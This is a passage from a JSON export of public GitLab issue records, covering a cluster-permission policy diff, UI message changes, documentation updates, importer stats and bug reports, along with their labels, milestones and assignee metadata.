ProjectPolicy \u003c BasePolicy\n   rule { can?(:developer_access) \u0026 can?(:create_issue) }.enable :import_issues\n\n   rule { can?(:developer_access) }.policy do\n+    enable :read_cluster\n     enable :create_package\n     enable :admin_issue_board\n     enable :admin_merge_request\n@@ -427,7 +428,6 @@ class ProjectPolicy \u003c BasePolicy\n     enable :read_pages\n     enable :update_pages\n     enable :remove_pages\n-    enable :read_cluster\n     enable :add_cluster\n     enable :create_cluster\n     enable :update_cluster\n```\n\n@bwill\n\n/cc @sam.white @nagyv-gitlab","state":"closed","created_at":"2021-12-08T19:53:28.300Z","updated_at":"2022-02-21T03:20:50.238Z","closed_at":"2022-02-16T12:49:15.063Z","closed_by":{"id":9878214,"username":"bauerdominic","name":"Dominic Bauer","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9878214/avatar.png","web_url":"https://gitlab.com/bauerdominic"},"labels":["Category:Container Scanning","Category:Kubernetes Management","Category:Vulnerability Management","Deliverable","backend","devops::govern","feature::addition","group::security policies","missed-deliverable","missed:14.7","section::sec","type::feature","workflow::verification"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[],"author":{"id":8953999,"username":"bwill","name":"Brian Williams","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8953999/avatar.png","web_url":"https://gitlab.com/bwill"},"type":"ISSUE","assignee":null,"user_notes_count":18,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347471","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347471","notes":"https://gitlab.com/api/v4/projects/278964/issues/347471/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347471/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347471","relative":"#347471","full":"gitlab-org/gitlab#347471"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":115,"epic":{"id":187,"iid":115,"title":"Category Epic: Kubernetes Management","url":"/groups/gitlab-org/-/epics/115","group_id":9970,"human_readable_end_date":"May 17, 2023","human_readable_timestamp":"\u003cstrong\u003e4\u003c/strong\u003e months remaining"},"iteration":null,"health_status":null},{"id":98697759,"iid":347468,"project_id":278964,"title":"Clarify the empty-state message for the projects \"pending deletion\" tab","description":"### Problem to solve\n\nOn the Projects \"pending deletion\" tab, when there are no projects pending deletion, the empty-state message says: \"You havent removed any projects.\"  That is a bit misleading, because all projects pending deletion will appear on this page regardless of who removed them.  Also, we plan to [allow owners to list projects pending deletion](https://gitlab.com/gitlab-org/gitlab/-/issues/346976) on the same page, and need this message to be more generic for them as well.\n\n### Proposal\n\n1. Update the tab\n```patch\n- Deleted projects\n+ Pending deletion\n```\n2. Update the empty state message\n```patch\n- You havent removed any projects. \n+ No projects pending deletion found\n- Projects which are removed and are yet to be permanently removed are visible here.\n+ Projects that are pending deletion that you have access to are listed here. Learn more.\n```\n\n3. Add [Learn more](https://docs.gitlab.com/ee/user/project/settings/index.html#delayed-project-deletion) link to docs\n\n4. Center align empty state message body text\n\n5. Update the documentation to reflect these changes\n\n\n\u003cdetails\u003e\u003csummary\u003eBefore\u003c/summary\u003e\n![Screenshot_2021-12-08_at_13-55-31_Dashboard](/uploads/7750d5a23415762037722c07a3d83e09/Screenshot_2021-12-08_at_13-55-31_Dashboard.png)\n\u003c/details\u003e\n\n\u003cdetails\u003e\u003csummary\u003eAfter\u003c/summary\u003e\n\n![Screenshot_2021-12-09_at_10-58-41_Dashboard](/uploads/c1702989e1709e28ced148fc519c71a4/Screenshot_2021-12-09_at_10-58-41_Dashboard.png)\n\n\u003c/details\u003e\n\n### What does success look like?\n\nAny user that visits this page should be able to interpret why no projects are being displayed","state":"closed","created_at":"2021-12-08T18:28:31.282Z","updated_at":"2022-01-05T10:32:56.439Z","closed_at":"2021-12-16T12:17:28.699Z","closed_by":{"id":9821577,"username":"huzaifaiftikhar1","name":"Huzaifa Iftikhar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9821577/avatar.png","web_url":"https://gitlab.com/huzaifaiftikhar1"},"labels":["Technical Writing","UI polish","UX","devops::manage","frontend","group::compliance","section::dev","type::feature","workflow::verification"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":9821577,"username":"huzaifaiftikhar1","name":"Huzaifa Iftikhar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9821577/avatar.png","web_url":"https://gitlab.com/huzaifaiftikhar1"}],"author":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"type":"ISSUE","assignee":{"id":9821577,"username":"huzaifaiftikhar1","name":"Huzaifa Iftikhar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9821577/avatar.png","web_url":"https://gitlab.com/huzaifaiftikhar1"},"user_notes_count":18,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347468","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347468","notes":"https://gitlab.com/api/v4/projects/278964/issues/347468/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347468/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347468","relative":"#347468","full":"gitlab-org/gitlab#347468"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3626,"epic":{"id":69474,"iid":3626,"title":"Improvements to delayed project deletion","url":"/groups/gitlab-org/-/epics/3626","group_id":9970,"human_readable_end_date":"Sep 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98693483,"iid":347464,"project_id":278964,"title":"[UX] Change the SM expiring banner into an alert","description":"## Summary\n\n|  | Description |\n| ------ | ------ |\n| **User** | **** **User 1**: An Admin on the self-managed Instance ([Sidney - Systems Admin](https://about.gitlab.com/handbook/marketing/strategic-marketing/roles-personas/#sidney-systems-administrator)) |\n| **Problem** | We are currently using a banner and should be using an alert for letting users know their subscription is about to expire |\n| **When** | **** When a subscription is about to expire\u003cbr\u003e**** When a subscription has expired |\n| **Where** | There are two main touchpoints on the UX:\u003cbr\u003e**** **User 1**: Self-managed instance (Dashboard)\u003cbr\u003e**** **User 1**: Self-managed instance (Subscription page)  |\n| **Why** | We will use the correct pajamas component and this will bring greater consistency across our licensing messaging |\n\n## Proposal\n\nChange the banners on the two main touchpoints (Dashboard + Subscription pages) to use an alert and where applicable update the messaging to remain consistent.\n\n#### Old (using Banner)\n\n![image](/uploads/525b3d554cc2a486cddaedb5f9fc28c2/image.png)\n\n#### New (using Alert) \n\n![Alert](/uploads/3fc363e477f3839722189d11fa0ada99/Alert.png)\n\n---\n\nRelated to https://gitlab.com/gitlab-org/gitlab/-/issues/346259#note_757517224","state":"closed","created_at":"2021-12-08T17:45:22.482Z","updated_at":"2022-01-19T21:34:03.801Z","closed_at":"2022-01-18T19:36:35.292Z","closed_by":{"id":3354144,"username":"timnoah","name":"Tim Noah","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3354144/avatar.png","web_url":"https://gitlab.com/timnoah"},"labels":["Maintenance and Support","UX","[deprecated] Category:Provision","devops::fulfillment","documentation","group::provision","section::fulfillment","type::feature","workflow::ready for development"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":3354144,"username":"timnoah","name":"Tim Noah","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3354144/avatar.png","web_url":"https://gitlab.com/timnoah"}],"author":{"id":3354144,"username":"timnoah","name":"Tim Noah","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3354144/avatar.png","web_url":"https://gitlab.com/timnoah"},"type":"ISSUE","assignee":{"id":3354144,"username":"timnoah","name":"Tim Noah","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3354144/avatar.png","web_url":"https://gitlab.com/timnoah"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347464","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347464","notes":"https://gitlab.com/api/v4/projects/278964/issues/347464/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347464/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347464","relative":"#347464","full":"gitlab-org/gitlab#347464"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6383,"epic":{"id":310864,"iid":6383,"title":"THEME: Maintenance and Support","url":"/groups/gitlab-org/-/epics/6383","group_id":9970,"human_readable_end_date":"Nov 16, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98693360,"iid":347463,"project_id":278964,"title":"Update docs for dependency list","description":"## Why are we doing this work\nFrom https://gitlab.com/groups/gitlab-org/-/epics/6698#note_751124239:\n\u003e it looks like in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75084 the documentation was updated for our Container Scanning page. Maybe this is already planned somewhere, but I believe we also need some updates to https://docs.gitlab.com/ee/user/application_security/dependency_list/. As part of this, it would be great to have a new screenshot for the image in that documentation so we also have an image we can use as [part of our release post](https://gitlab.com/gitlab-com/www-gitlab-com/-/merge_requests/94853).\n\n\n## Non-functional requirements\n- [ ] Documentation:\n\n\n## Implementation plan\n- [ ] update documentation on https://docs.gitlab.com/ee/user/application_security/dependency_list/","state":"closed","created_at":"2021-12-08T17:42:50.863Z","updated_at":"2021-12-13T17:12:12.492Z","closed_at":"2021-12-13T17:12:12.471Z","closed_by":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"labels":["Technical Writing","auto updated","devops::govern","docs-only","group::security policies","section::sec","workflow::verification"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"}],"author":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"type":"ISSUE","assignee":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347463","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347463","notes":"https://gitlab.com/api/v4/projects/278964/issues/347463/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347463/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347463","relative":"#347463","full":"gitlab-org/gitlab#347463"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6698,"epic":{"id":343749,"iid":6698,"title":"Display Container Scanning Packages in GitLab's Dependency List","url":"/groups/gitlab-org/-/epics/6698","group_id":9970,"human_readable_end_date":"Dec 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98675807,"iid":347433,"project_id":278964,"title":"GithubImporter: Expose import stats on import status endpoint","description":"## Problem\n\nWhile importing a project from Github the user has little visibility of the progress.\n\n## Solution\n\nAn imported object fetched/counter was introduced in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/64256 and this is used for dashboards and to log the final stats of an import. This should also be exposed to the user through the import status endpoint (`/projects/:id/import`).","state":"closed","created_at":"2021-12-08T15:07:24.485Z","updated_at":"2022-05-05T12:45:13.030Z","closed_at":"2021-12-15T14:53:07.899Z","closed_by":{"id":696751,"username":"kassio","name":"Kassio Borges","state":"active","avatar_url":"https://secure.gravatar.com/avatar/be7919dfa5d1e8b8826bf51bfc747055?s=80\u0026d=identicon","web_url":"https://gitlab.com/kassio"},"labels":["Category:Importers","Importer:GitHub","Next Up","auto updated","backend","devops::manage","group::import","section::dev","type::feature","workflow::production"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":696751,"username":"kassio","name":"Kassio Borges","state":"active","avatar_url":"https://secure.gravatar.com/avatar/be7919dfa5d1e8b8826bf51bfc747055?s=80\u0026d=identicon","web_url":"https://gitlab.com/kassio"}],"author":{"id":696751,"username":"kassio","name":"Kassio Borges","state":"active","avatar_url":"https://secure.gravatar.com/avatar/be7919dfa5d1e8b8826bf51bfc747055?s=80\u0026d=identicon","web_url":"https://gitlab.com/kassio"},"type":"ISSUE","assignee":{"id":696751,"username":"kassio","name":"Kassio Borges","state":"active","avatar_url":"https://secure.gravatar.com/avatar/be7919dfa5d1e8b8826bf51bfc747055?s=80\u0026d=identicon","web_url":"https://gitlab.com/kassio"},"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347433","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347433","notes":"https://gitlab.com/api/v4/projects/278964/issues/347433/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347433/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347433","relative":"#347433","full":"gitlab-org/gitlab#347433"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3051,"epic":{"id":39431,"iid":3051,"title":" GitHub Importer improvements","url":"/groups/gitlab-org/-/epics/3051","group_id":9970},"iteration":null,"health_status":null},{"id":98673194,"iid":347426,"project_id":278964,"title":"Investigate billing and invite in side nav nesting","description":"Investigate how these 2 experiments triggered nesting when, on initial look, they don't seem to be nested\n\nThe following discussion from !76252 should be addressed:\n\n- [ ] @jejacks0n started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/76252#note_755315382):  (+2 comments)\n\n    \u003e @jayswain, I'm going to assign this to you for a quick review, and then will pass forward to @dstull who will probably want to merge this in the next couple hours if everything seems ok with it. It's causing some issues outlined in https://gitlab.com/gitlab-org/gitlab/-/issues/347329","state":"closed","created_at":"2021-12-08T14:21:16.923Z","updated_at":"2021-12-08T20:00:39.001Z","closed_at":"2021-12-08T20:00:38.963Z","closed_by":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"labels":["group::acquisition","workflow::ready for development"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"}],"author":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"type":"ISSUE","assignee":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347426","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347426","notes":"https://gitlab.com/api/v4/projects/278964/issues/347426/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347426/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347426","relative":"#347426","full":"gitlab-org/gitlab#347426"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98680930,"iid":347434,"project_id":278964,"title":"Missing git executable warning","description":"When running the analyzer in the self-manged GitLab v14.5.2 (default settings as per [official documentation](https://docs.gitlab.com/14.5/ee/user/application_security/iac_scanning/index.html#configure-iac-scanning-manually) I get:  \n`[WARN] [kics] [2021-12-08T11:43:43Z]  Could not detect git executable`\n\nInstalling git from the Alpine repo fixes the issue.","state":"closed","created_at":"2021-12-08T12:11:18.121Z","updated_at":"2022-12-20T15:49:40.127Z","closed_at":"2022-12-11T21:43:57.816Z","closed_by":{"id":11648083,"username":"jamesliu-gitlab","name":"James Liu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11648083/avatar.png","web_url":"https://gitlab.com/jamesliu-gitlab"},"labels":["Category:SAST","[deprecated] Accepting merge requests","backend","devops::secure","group::static analysis","priority::3","section::sec","severity::3","type::bug","workflow::production"],"milestone":{"id":2717597,"iid":82,"group_id":9970,"title":"15.7","description":"","state":"active","created_at":"2022-07-29T14:48:31.199Z","updated_at":"2022-07-29T14:48:31.199Z","due_date":"2022-12-17","start_date":"2022-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/82"},"assignees":[{"id":11648083,"username":"jamesliu-gitlab","name":"James Liu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11648083/avatar.png","web_url":"https://gitlab.com/jamesliu-gitlab"}],"author":{"id":4248916,"username":"107142","name":"Marek Jaros","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4248916/avatar.png","web_url":"https://gitlab.com/107142"},"type":"ISSUE","assignee":{"id":11648083,"username":"jamesliu-gitlab","name":"James Liu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11648083/avatar.png","web_url":"https://gitlab.com/jamesliu-gitlab"},"user_notes_count":7,"merge_requests_count":0,"upvotes":5,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347434","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347434","notes":"https://gitlab.com/api/v4/projects/278964/issues/347434/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347434/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347434","relative":"#347434","full":"gitlab-org/gitlab#347434"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98662260,"iid":347414,"project_id":278964,"title":"Connect mutation for security training configuration","description":"Save the security training configuration by calling the GraphQL mutation\n\n![2021-12-09_at_10.14_PM](/uploads/c58746493d3efd24cc5ffb5b0ed8ef59/2021-12-09_at_10.14_PM.png)","state":"closed","created_at":"2021-12-08T10:45:07.506Z","updated_at":"2022-01-24T03:36:02.511Z","closed_at":"2022-01-18T11:59:44.261Z","closed_by":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"labels":["devops::secure","frontend","group::threat insights","section::sec","type::feature"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"}],"author":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"type":"ISSUE","assignee":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"user_notes_count":0,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347414","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347414","notes":"https://gitlab.com/api/v4/projects/278964/issues/347414/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347414/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347414","relative":"#347414","full":"gitlab-org/gitlab#347414"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6176,"epic":{"id":287896,"iid":6176,"title":"Integrate developer security training into vulnerability management","url":"/groups/gitlab-org/-/epics/6176","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98661852,"iid":347412,"project_id":278964,"title":"Cannot dismiss alert in pipeline page","description":"### Summary\n\nCannot dismiss alert in pipeline page when I get an error\n\n### Steps to reproduce\n\nI visited the pipeline page and happened to get an error upon retrying. The error could not be dismissed.\n\n### Example Project\n\nExample URL https://gitlab.com/gitlab-org/gitlab/-/pipelines/424992634\n\n### Relevant logs and/or screenshots\n\n![2021-12-08_11.35.14](/uploads/67cb07603de5f24f184875436aea5e04/2021-12-08_11.35.14.gif)\n\n### Output of checks\n\nThis bug happens on GitLab.com","state":"closed","created_at":"2021-12-08T10:38:43.302Z","updated_at":"2022-01-13T14:28:59.259Z","closed_at":"2022-01-13T14:28:49.813Z","closed_by":{"id":1125848,"username":"samdbeckham","name":"Sam Beckham","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1125848/avatar.png","web_url":"https://gitlab.com/samdbeckham"},"labels":["Category:Continuous Integration","devops::verify","frontend","group::pipeline execution","needs weight","priority::4","section::ops","severity::4","type::bug","workflow::verification"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":829774,"username":"jivanvl","name":"Jose Ivan Vargas","state":"active","avatar_url":"https://secure.gravatar.com/avatar/730cc1b85a20f2a3891829f7aa198972?s=80\u0026d=identicon","web_url":"https://gitlab.com/jivanvl"}],"author":{"id":1607849,"username":"mrincon","name":"Miguel Rincon","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1607849/avatar.png","web_url":"https://gitlab.com/mrincon"},"type":"ISSUE","assignee":{"id":829774,"username":"jivanvl","name":"Jose Ivan Vargas","state":"active","avatar_url":"https://secure.gravatar.com/avatar/730cc1b85a20f2a3891829f7aa198972?s=80\u0026d=identicon","web_url":"https://gitlab.com/jivanvl"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347412","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347412","notes":"https://gitlab.com/api/v4/projects/278964/issues/347412/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347412/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347412","relative":"#347412","full":"gitlab-org/gitlab#347412"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98661461,"iid":347411,"project_id":278964,"title":"Improve placement of merge commits export button on smaller screens in the compliance report","description":"### Problem to solve \n\nOn smaller screens, the `List of all merge commits` button pushes up against the page title\n\n### Proposal\n\nOn smaller screens, move the button to below the page title and description\n\n### Designs\n\n| Overflow | Relocated |\n|----------|-----------|\n| ![Screen_Shot_2021-12-07_at_15.42.00](https://gitlab.com/gitlab-org/gitlab/uploads/7b46a5cb4473cadbddb6cfab208f6bec/Screen_Shot_2021-12-07_at_15.42.00.png) | ![Screen_Shot_2021-12-07_at_15.35.59](https://gitlab.com/gitlab-org/gitlab/uploads/de405285727ad8ef3c003b7500ea8ea6/Screen_Shot_2021-12-07_at_15.35.59.png) |\n\n### Implementation plan\n\n1. Add a new button that is hidden on larger screens\n1. Add a class to hide the main button on smaller screens\n1. Update specs","state":"closed","created_at":"2021-12-08T10:32:57.065Z","updated_at":"2022-01-31T10:50:36.365Z","closed_at":"2022-01-31T10:50:36.346Z","closed_by":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"labels":["Category:Compliance Management","Enterprise Edition","GitLab Ultimate","devops::manage","feature::enhancement","frontend","group::compliance","priority::3","section::dev","type::feature","workflow::in review"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":3468028,"username":"jiaan","name":"Jiaan 